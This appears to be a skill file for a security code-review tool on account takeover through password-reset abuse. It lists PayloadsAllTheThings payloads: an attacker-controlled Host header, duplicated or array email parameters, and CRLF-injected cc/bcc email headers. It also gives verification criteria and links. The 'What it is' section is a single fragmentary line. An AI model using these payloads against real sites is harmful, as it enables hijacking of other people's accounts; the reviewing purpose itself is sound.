# Account Takeover — @hijackr skill
> cats: (advisory — no static taint rule yet) · severity: high
> sources: PayloadsAllTheThings, HackTricks

## What it is
1. Request password reset to your email address

## Exploit payloads (from PayloadsAllTheThings)
- `POST https://example.com/reset.php HTTP/1.1`
- `Accept: */*`
- `Content-Type: application/json`
- `Host: [ATTACKER.DOMAIN.TLD]`
- `email=victim@mail.com&email=hacker@mail.com`
- `{"email":["victim@mail.com","hacker@mail.com"]}`
- `email=victim@mail.com%0A%0Dcc:hacker@mail.com`
- `email=victim@mail.com%0A%0Dbcc:hacker@mail.com`

## VERIFY
- CONFIRMED when: untrusted input reaches the sink/condition described above and
  NO mitigating control (input validation, allow-list, output encoding, auth/ownership
  check, or safe API) is present in the data path.
- FALSE POSITIVE when: a correct mitigation from Remediation is applied, the value is
  constant / allow-listed, or the matched symbol is a benign same-named API.
- LIKELY when: the dangerous pattern is present but the mitigating control or an exploit
  precondition is not visible in the reviewed code.

## References
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Account%20Takeover
- HackTricks: https://book.hacktricks.wiki/en/search.html?q=Account%20Takeover
- HackTricks Cloud: https://cloud.hacktricks.wiki/

## HackTricks pages (4)

- [2FA/MFA/OTP Bypass](https://hacktricks.wiki/en/pentesting-web/2fa-bypass)
- [Account Takeover](https://hacktricks.wiki/en/pentesting-web/account-takeover)
- [Registration & Takeover Vulnerabilities](https://hacktricks.wiki/en/pentesting-web/registration-vulnerabilities)
- [Reset/Forgotten Password Bypass](https://hacktricks.wiki/en/pentesting-web/reset-password)

## References
- HackTricks: https://hacktricks.wiki/en/
- HackTricks repo: https://github.com/HackTricks-wiki/hacktricks
